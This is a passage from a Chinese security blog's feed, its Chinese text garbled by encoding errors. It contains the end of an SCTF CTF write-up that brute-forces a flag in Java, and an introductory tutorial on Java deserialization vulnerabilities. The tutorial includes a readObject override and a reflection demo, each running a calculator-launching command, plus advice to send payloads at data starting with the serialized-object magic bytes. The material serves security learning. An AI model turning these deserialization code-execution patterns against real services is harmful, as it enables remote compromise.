class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>åˆ†æåŠ å¯†ç±»ä¹‹åå¯ä»¥çŸ¥é“æ¯ä¸ªå­—ç¬¦è¿›å»åè¾“å‡ºçš„å¯†æ–‡éƒ½æ˜¯ä¸€ä¸ªå›ºå®šçš„å­—ç¬¦ä¸²<br>äºæ˜¯ç›´æ¥çˆ†ç ´æ¯ä¸€ä½<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.String;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       c a = <span class="keyword">new</span> c();</span><br><span class="line">       String flag = <span class="string">"sctf&#123;"</span>;</span><br><span class="line">       String printable = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()*+,-.:;&lt;=&gt;?@[]^_&#123;|&#125;~"</span>;</span><br><span class="line">       String ss = <span class="string">"C28BC39DC3A6C283C2B3C39DC293C289C2B8C3BAC29EC3A0C3A7C29A1654C3AF28C3A1C2B1215B53"</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">100</span>;j++)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;printable.length();i++)</span><br><span class="line">           &#123;</span><br><span class="line">               String now=  flag + printable.charAt(i);</span><br><span class="line">               <span class="comment">//System.out.println(now);</span></span><br><span class="line">               String d = a.a(now,<span class="string">"E7E64BF658BAB14A25C9D67A054CEBE5"</span>);</span><br><span class="line">               <span class="keyword">if</span>(ss.indexOf(d) == <span class="number">0</span>)</span><br><span class="line">               &#123;</span><br><span class="line">                   System.out.println(<span class="string">"flag: "</span> + now);</span><br><span class="line">                   flag = now;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">//break;</span></span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/img/2019-sctf-7.png" alt=""></p>
<h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>å¥½ä¹…æ²¡æœ‰è¿™ä¹ˆè‚ä¸€åœºæ¯”èµ›äº†ï¼Œæœ€åæˆ‘ä»¬é˜Ÿå› ä¸º123è¡€å¤ªå°‘åªæ‹¿äº†ç¬¬ä¸‰ï¼Œç¨å¾®æœ‰äº›é—æ†¾ï¼Œä½†è¿˜æ˜¯æ„Ÿè°¢é˜Ÿå‹ï¼Œæ„Ÿè°¢å‡ºé¢˜å’Œè¿ç»´å¸ˆå‚…ä»¬é€’èŒ¶ï¼Œç»™å¸ˆå‚…ä»¬é€’èŒ¶ï¼</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åˆšåˆšæ¯•ä¸šï¼Œæ­£å¥½å‘¨æœ«é‡ä¸ŠSCTFï¼Œæ‰“äº†ä¸¤å¤©ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹åšçš„å‡ é“é¢˜&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>JAVAååºåˆ—åŒ–æ¼æ´ç³»åˆ—ä¹‹â€”åŸºç¡€çŸ¥è¯†</title>
    <link href="https://www.codemonster.cn/2019/01/24/java-serialize-vuln0/"/>
    <id>https://www.codemonster.cn/2019/01/24/java-serialize-vuln0/</id>
    <published>2019-01-24T08:15:27.000Z</published>
    <updated>2019-06-24T08:57:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>JAVAååºåˆ—åŒ–æ¼æ´è¿‘å‡ å¹´æ¥ååˆ†çƒ­é—¨ï¼Œäºæ˜¯æ‰“ç®—è®°å½•ä¸‹ä»é›¶å¼€å§‹å­¦ä¹ JAVAååºåˆ—åŒ–æ¼æ´çš„è¿‡ç¨‹ï¼Œäºæ˜¯å°±æœ‰äº†æœ¬ç³»åˆ—æ–‡ç« ï¼Œå†™çš„ä¸å¥½æ¬¢è¿å¸ˆå‚…ä»¬æ–§æ­£ã€‚<br>æœ¬ç¯‡æ–‡ç« ä¸»è¦ä»‹ç»JAVAçš„åŸºç¡€çŸ¥è¯†ï¼Œä¸å®šæ—¶ä¼šè¡¥å……ä¸€äº›æ–°çš„çŸ¥è¯†ç‚¹ã€‚<br><a id="more"></a><br><!-- æœ¬ç³»åˆ—æ‰€æœ‰æºç ä¸poc&expï¼šhttps://github.com/xishir/ --></p>
<h1 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h1><p>æ™®é€šè¯­æ³•å°±ä¸éœ€è¦å¤šè®²äº†å§ï¼ŒJAVAåŸºç¡€å·®åŒå­¦å¯ä»¥å…ˆè¿‡ä¸€ä¸‹èœé¸Ÿè¯¾ç¨‹<br><a href="http://www.runoob.com/java/java-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/java/java-tutorial.html</a><br>è¿™è¾¹ç®€å•åˆ—ä¸¾ä¸€ä¸‹éœ€è¦æŒæ¡çš„ç‚¹</p>
<ul>
<li>å®‰è£…jdk</li>
<li>åŸºç¡€è¯­æ³•</li>
<li>å¯¹è±¡å’Œç±»</li>
<li>IOæµã€æ–‡ä»¶æ“ä½œ</li>
<li>å¼‚å¸¸å¤„ç†</li>
<li>å°è£…ç»§æ‰¿å¤šæ€ã€æŠ½è±¡ã€æ¥å£</li>
<li>æ³›å‹</li>
<li>ç½‘ç»œç¼–ç¨‹</li>
<li>Servlet</li>
<li>SSHã€SSMæ¡†æ¶</li>
<li>Mavençš„ä½¿ç”¨</li>
<li>ä¸»æµä¸­é—´ä»¶</li>
<li>ä¸»æµIDEçš„ä½¿ç”¨</li>
</ul>
<h1 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h1><ul>
<li>javaç¯å¢ƒï¼šjdk1.8.0_162</li>
<li>ç”µè„‘ç³»ç»Ÿï¼šmacOS Mojave 10.14.3</li>
<li>IDEï¼šIntelliJ IDEA</li>
</ul>
<h1 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h1><h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><p>åºåˆ—åŒ–ï¼ˆSerializationï¼‰æ˜¯å°†å¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯è½¬æ¢ä¸ºå¯ä»¥å­˜å‚¨æˆ–ä¼ è¾“çš„å½¢å¼çš„è¿‡ç¨‹ã€‚ä¸€èˆ¬å°†ä¸€ä¸ªå¯¹è±¡å­˜å‚¨è‡³ä¸€ä¸ªå‚¨å­˜åª’ä»‹ï¼Œä¾‹å¦‚æ¡£æ¡ˆæˆ–æ˜¯è®°äº¿ä½“ç¼“å†²ç­‰ã€‚åœ¨ç½‘ç»œä¼ è¾“è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥æ˜¯å­—èŠ‚æˆ–æ˜¯XMLç­‰æ ¼å¼ã€‚è€Œå­—èŠ‚çš„æˆ–XMLç¼–ç æ ¼å¼å¯ä»¥è¿˜åŸå®Œå…¨ç›¸ç­‰çš„å¯¹è±¡ã€‚è¿™ä¸ªç›¸åçš„è¿‡ç¨‹åˆç§°ä¸ºååºåˆ—åŒ–ã€‚<br>ä»€ä¹ˆæƒ…å†µä¸‹éœ€è¦åºåˆ—åŒ–</p>
<ul>
<li>å°†å†…å­˜ä¸­çš„å¯¹è±¡ä¿å­˜åˆ°æ–‡ä»¶ä¸­æˆ–è€…æ•°æ®åº“</li>
<li>ç”¨å¥—æ¥å­—åœ¨ç½‘ç»œä¸Šä¼ é€å¯¹è±¡</li>
<li>é€šè¿‡RMIä¼ è¾“å¯¹è±¡  </li>
</ul>
<p>åºåˆ—åŒ–çš„ä½œç”¨å°±æ˜¯å¯¹è±¡çš„<code>æŒä¹…åŒ–</code>å’Œ<code>ä¼ é€’</code>ã€‚ </p>
<p>ç±»é€šè¿‡å®ç°<code>java.io.Serializable</code>æ¥å£ä»¥å¯ç”¨å…¶åºåˆ—åŒ–åŠŸèƒ½ã€‚æœªå®ç°æ­¤æ¥å£çš„ç±»å°†æ— æ³•ä½¿å…¶ä»»ä½•çŠ¶æ€åºåˆ—åŒ–æˆ–ååºåˆ—åŒ–ã€‚å¯åºåˆ—åŒ–ç±»çš„æ‰€æœ‰å­ç±»å‹æœ¬èº«éƒ½æ˜¯å¯åºåˆ—åŒ–çš„ã€‚åºåˆ—åŒ–æ¥å£æ²¡æœ‰æ–¹æ³•æˆ–å­—æ®µï¼Œä»…ç”¨äºæ ‡è¯†å¯åºåˆ—åŒ–çš„è¯­ä¹‰ã€‚  </p>
<h2 id="ç®€å•å®ä¾‹"><a href="#ç®€å•å®ä¾‹" class="headerlink" title="ç®€å•å®ä¾‹"></a>ç®€å•å®ä¾‹</h2><p>å¯¹è±¡åºåˆ—åŒ–åŒ…æ‹¬å¦‚ä¸‹æ­¥éª¤ï¼š</p>
<ol>
<li>åˆ›å»ºä¸€ä¸ªå¯¹è±¡è¾“å‡ºæµï¼Œå®ƒå¯ä»¥åŒ…è£…ä¸€ä¸ªå…¶ä»–ç±»å‹çš„ç›®æ ‡è¾“å‡ºæµï¼Œå¦‚æ–‡ä»¶è¾“å‡ºæµï¼›</li>
<li>é€šè¿‡å¯¹è±¡è¾“å‡ºæµçš„writeObject()æ–¹æ³•å†™å¯¹è±¡ã€‚  </li>
</ol>
<p>å¯¹è±¡ååºåˆ—åŒ–çš„æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li>åˆ›å»ºä¸€ä¸ªå¯¹è±¡è¾“å…¥æµï¼Œå®ƒå¯ä»¥åŒ…è£…ä¸€ä¸ªå…¶ä»–ç±»å‹çš„æºè¾“å…¥æµï¼Œå¦‚æ–‡ä»¶è¾“å…¥æµï¼›</li>
<li>é€šè¿‡å¯¹è±¡è¾“å…¥æµçš„readObject()æ–¹æ³•è¯»å–å¯¹è±¡ã€‚<br>ç®€å•ä¸¾ä¸ªğŸŒ°ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xishir.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String n;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test</span><span class="params">(String n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.n = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line">        Test obj = <span class="keyword">new</span> Test(<span class="string">"Serialize Test"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–å¯¹è±¡</span></span><br><span class="line">        ObjectOutputStream output = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"test.obj"</span>));</span><br><span class="line">        output.writeObject(obj);</span><br><span class="line">        output.flush();</span><br><span class="line">        output.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ååºåˆ—åŒ–å¯¹è±¡</span></span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"test.obj"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(file));</span><br><span class="line">        Object x = ois.readObject();</span><br><span class="line">        System.out.print(x);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
è¿è¡Œç»“æœ<br><img src="/img/ser/ser0-2.png" alt=""></li>
</ol>
<p>å¯¹è±¡åºåˆ—åŒ–åå­˜å‚¨ä¸º<code>test.obj</code>ï¼Œå†…å®¹æ˜¯è¿™æ ·çš„<br><img src="/img/ser/ser0-1.png" alt=""><br>å¯ä»¥çœ‹åˆ°äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯ä»¥<code>aced 0005</code>å¼€å¤´çš„ï¼Œå¦‚æœæ˜¯base64å°±æ˜¯ä»¥<code>rO0a</code>å¼€å¤´çš„ï¼ˆåˆ’é‡ç‚¹ï¼è§åˆ°ç±»ä¼¼çš„æ•°æ®ä¼ è¾“æ“èµ·é”®ç›˜å°±æ˜¯ä¸€æ¢­å­payloadè¿‡å»<br><img src="/img/ser/ser0-3.png" alt=""></p>
<h2 id="è‡ªå®šä¹‰ååºåˆ—åŒ–è¡Œä¸º"><a href="#è‡ªå®šä¹‰ååºåˆ—åŒ–è¡Œä¸º" class="headerlink" title="è‡ªå®šä¹‰ååºåˆ—åŒ–è¡Œä¸º"></a>è‡ªå®šä¹‰ååºåˆ—åŒ–è¡Œä¸º</h2><p>è‡ªå®šä¹‰åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ï¼Œå°±æ˜¯é‡å†™<code>writeObject</code>å’Œ<code>readObject</code>æ–¹æ³•ã€‚<br>å›½é™…æƒ¯ä¾‹ï¼Œå¼¹ä¸ªè®¡ç®—å™¨<br><img src="/img/ser/ser0-4.png" alt=""><br>readObjectçš„ä»£ç ä¸ºï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    in.defaultReadObject();</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">"open -a calculator"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å½“åºåˆ—åŒ–å¯¹è±¡çš„æ—¶å€™å°±ä¼šæ‰§è¡ŒwriteObjectæ–¹æ³•ï¼Œååºåˆ—åŒ–å¯¹è±¡çš„æ—¶å€™å°±ä¼šæ‰§è¡ŒreadObjectæ–¹æ³•ï¼Œä»è€Œæ§åˆ¶èƒ½å¤Ÿååºåˆ—åŒ–çš„è¡Œä¸ºã€‚</p>
<h2 id="serialVersionUID"><a href="#serialVersionUID" class="headerlink" title="serialVersionUID"></a>serialVersionUID</h2><p>serialVersionUIDçš„å–å€¼æ˜¯Javaè¿è¡Œæ—¶ç¯å¢ƒæ ¹æ®ç±»çš„å†…éƒ¨ç»†èŠ‚è‡ªåŠ¨ç”Ÿæˆçš„ã€‚å¦‚æœå¯¹ç±»çš„æºä»£ç ä½œäº†ä¿®æ”¹ï¼Œå†é‡æ–°ç¼–è¯‘ï¼Œæ–°ç”Ÿæˆçš„ç±»æ–‡ä»¶çš„serialVersionUIDçš„å–å€¼æœ‰å¯èƒ½ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–ï¼Œä¼šå¯¼è‡´ä¹‹å‰åºåˆ—åŒ–çš„ç±»æ— æ³•å†ååºåˆ—åŒ–å›æ¥ã€‚<br>ç±»çš„serialVersionUIDçš„é»˜è®¤å€¼å®Œå…¨ä¾èµ–äºJavaç¼–è¯‘å™¨çš„å®ç°ï¼Œå¯¹äºåŒä¸€ä¸ªç±»ï¼Œç”¨ä¸åŒçš„Javaç¼–è¯‘å™¨ç¼–è¯‘ï¼Œæœ‰å¯èƒ½ä¼šå¯¼è‡´ä¸åŒçš„ serialVersionUIDï¼Œä¹Ÿæœ‰å¯èƒ½ç›¸åŒã€‚ä¸ºäº†æé«˜serialVersionUIDçš„ç‹¬ç«‹æ€§å’Œç¡®å®šæ€§ï¼Œå¼ºçƒˆå»ºè®®åœ¨ä¸€ä¸ªå¯åºåˆ—åŒ–ç±»ä¸­æ˜¾ç¤ºçš„å®šä¹‰serialVersionUIDï¼Œä¸ºå®ƒèµ‹äºˆæ˜ç¡®çš„å€¼ã€‚</p>
<h2 id="å®‰å…¨é£é™©"><a href="#å®‰å…¨é£é™©" class="headerlink" title="å®‰å…¨é£é™©"></a>å®‰å…¨é£é™©</h2><p>è”æƒ³phpçš„ååºåˆ—åŒ–æ¼æ´ï¼Œå¯ä»¥å‘ç°readObjectæ–¹æ³•å’Œphpä¸­çš„é­”æœ¯æ–¹æ³•å¼‚æ›²åŒå·¥ï¼Œè€Œå¤§éƒ¨åˆ†Javaååºåˆ—åŒ–æ¼æ´çš„åŸç†å°±æ˜¯æŸä¸ªç±»é‡å†™äº†<code>readObject</code>æ–¹æ³•ï¼Œåœ¨</p>
<h1 id="Javaåå°„æœºåˆ¶"><a href="#Javaåå°„æœºåˆ¶" class="headerlink" title="Javaåå°„æœºåˆ¶"></a>Javaåå°„æœºåˆ¶</h1><h2 id="åŸºæœ¬æ¦‚å¿µ-1"><a href="#åŸºæœ¬æ¦‚å¿µ-1" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><p>Javaåå°„æœºåˆ¶</p>
<ul>
<li>æŒ‡çš„æ˜¯å¯ä»¥äºè¿è¡Œæ—¶åŠ è½½,æ¢çŸ¥å’Œä½¿ç”¨ç¼–è¯‘æœŸé—´å®Œå…¨æœªçŸ¥çš„ç±».</li>
<li>ç¨‹åºåœ¨è¿è¡ŒçŠ¶æ€ä¸­, å¯ä»¥åŠ¨æ€åŠ è½½ä¸€ä¸ªåªæœ‰åç§°çš„ç±», å¯¹äºä»»æ„ä¸€ä¸ªå·²ç»åŠ è½½çš„ç±»,éƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•; å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡,éƒ½èƒ½è°ƒç”¨ä»–çš„ä»»æ„ä¸€ä¸ªæ–¹æ³•å’Œå±æ€§;</li>
<li>åŠ è½½å®Œç±»ä¹‹å, åœ¨å †å†…å­˜ä¸­ä¼šäº§ç”Ÿä¸€ä¸ªClassç±»å‹çš„å¯¹è±¡(ä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªClasså¯¹è±¡), è¿™ä¸ªå¯¹è±¡åŒ…å«äº†å®Œæ•´çš„ç±»çš„ç»“æ„ä¿¡æ¯,è€Œä¸”è¿™ä¸ªClasså¯¹è±¡å°±åƒä¸€é¢é•œå­,é€è¿‡è¿™ä¸ªé•œå­çœ‹åˆ°ç±»çš„ç»“æ„,æ‰€ä»¥è¢«ç§°ä¹‹ä¸º:åå°„.</li>
<li>æ¯ä¸ªç±»è¢«åŠ è½½è¿›å…¥å†…å­˜ä¹‹å,ç³»ç»Ÿå°±ä¼šä¸ºè¯¥ç±»ç”Ÿæˆä¸€ä¸ªå¯¹åº”çš„java.lang.Classå¯¹è±¡,é€šè¿‡è¯¥Classå¯¹è±¡å°±å¯ä»¥è®¿é—®åˆ°JVMä¸­çš„è¿™ä¸ªç±».</li>
</ul>
<p>Classå¯¹è±¡çš„è·å–æ–¹æ³•</p>
<ul>
<li>å®ä¾‹å¯¹è±¡çš„getClass()æ–¹æ³•;</li>
<li>ç±»çš„.class(æœ€å®‰å…¨/æ€§èƒ½æœ€å¥½)å±æ€§;</li>
<li>è¿ç”¨Class.forName(String className)åŠ¨æ€åŠ è½½ç±»,classNameéœ€è¦æ˜¯ç±»çš„å…¨é™å®šå(æœ€å¸¸ç”¨).<br>æ³¨æ„ï¼Œä½¿ç”¨åŠŸèƒ½â€.classâ€æ¥åˆ›å»ºClasså¯¹è±¡çš„å¼•ç”¨æ—¶ï¼Œä¸ä¼šè‡ªåŠ¨åˆå§‹åŒ–è¯¥Classå¯¹è±¡ï¼Œä½¿ç”¨forName()ä¼šè‡ªåŠ¨åˆå§‹åŒ–è¯¥Classå¯¹è±¡</li>
</ul>
<h2 id="ç®€å•å®ä¾‹-1"><a href="#ç®€å•å®ä¾‹-1" class="headerlink" title="ç®€å•å®ä¾‹"></a>ç®€å•å®ä¾‹</h2><p>è¿™é‡Œæˆ‘åªä¸¾ä¸ªæœ€ç®€å•çš„ä¾‹å­ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xishir.reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectionTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Class test = Test<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        System.out.println(<span class="string">"I am:"</span> + test.getName());</span><br><span class="line"></span><br><span class="line">        Method[] methods = test.getMethods();</span><br><span class="line">        <span class="keyword">for</span>(Method method : methods) &#123;</span><br><span class="line">            System.out.println(<span class="string">"I have this method:"</span> + method.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Method method = test.getMethod(<span class="string">"hack"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            Object x = method.invoke(<span class="keyword">new</span> Test(<span class="string">"xishir"</span>), <span class="string">"233333"</span>);<span class="comment">//ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»çš„å¯¹è±¡ã€‚ç¬¬äºŒå‚æ•°æ˜¯å‡½æ•°çš„å‚æ•°</span></span><br><span class="line">            System.out.println(x);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String a;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test</span><span class="params">(String a)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.a = a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hack</span><span class="params">(String b)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"test "</span> + <span class="keyword">this</span>.a + <span class="string">" and "</span> + b);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"open -a calculator"</span>);</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿è¡Œç»“æœï¼š<br><img src="/img/ser/ser0-5.png" alt=""><br>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æˆåŠŸç”¨<code>Test.class</code>å–åˆ°äº†Testç±»çš„Classå¯¹è±¡ï¼Œç„¶ååˆ—å‡ºTestçš„æ‰€æœ‰æ–¹æ³•ï¼Œæœ€åç”¨invokeè°ƒç”¨äº†ä¸€ä¸ªTestå¯¹è±¡çš„hackæ–¹æ³•ã€‚</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;JAVAååºåˆ—åŒ–æ¼æ´è¿‘å‡ å¹´æ¥ååˆ†çƒ­é—¨ï¼Œäºæ˜¯æ‰“ç®—è®°å½•ä¸‹ä»é›¶å¼€å§‹å­¦ä¹ JAVAååºåˆ—åŒ–æ¼æ´çš„è¿‡ç¨‹ï¼Œäºæ˜¯å°±æœ‰äº†æœ¬ç³»åˆ—æ–‡ç« ï¼Œå†™çš„ä¸å¥½æ¬¢è¿å¸ˆå‚…ä»¬æ–§æ­£ã€‚&lt;br&gt;æœ¬ç¯‡æ–‡ç« ä¸»è¦ä»‹ç»JAVAçš„åŸºç¡€çŸ¥è¯†ï¼Œä¸å®šæ—¶ä¼šè¡¥å……ä¸€äº›æ–°çš„çŸ¥è¯†ç‚¹ã€‚&lt;br&gt;
    
    </summary>
    
    
      <category term="ååºåˆ—åŒ–" scheme="https://www.codemonster.cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="JAVA" scheme="https://www.codemonster.cn/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>2018 HCTF web WriteUp</title>
    <link href="https://www.codemonster.cn/2018/11/13/2018-hctf-web-writeup/"/>
    <id>https://www.codemonster.cn/2018/11/13/2018-hctf-web-writeup/</id>
    <published>2018-11-13T06:42:59.000Z</published>
    <updated>2019-06-24T08:57:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>å‘¨æœ«è‚äº†ä¸¤å¤©HCTFï¼Œæ„Ÿè°¢é˜Ÿå‹ä»¬å¸¦é£ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹åšçš„WEBé¢˜<br>é¡ºä¾¿æ‰“ä¸ªå°å¹¿å‘Šï¼šDe1taé•¿æœŸæ‹› é€†å‘/pwn/å¯†ç å­¦/ç¡¬ä»¶/å–è¯/æ‚é¡¹/etc. é€‰æ‰‹ï¼Œæ€¥æ‹›äºŒè¿›åˆ¶å’Œå¯†ç é€‰æ‰‹,æœ‰æ„å‘çš„å¤§ä½¬è¯·è”ç³»ZGUxdGFAcHJvdG9ubWFpbC5jb20=</p>
<a id="more"></a>
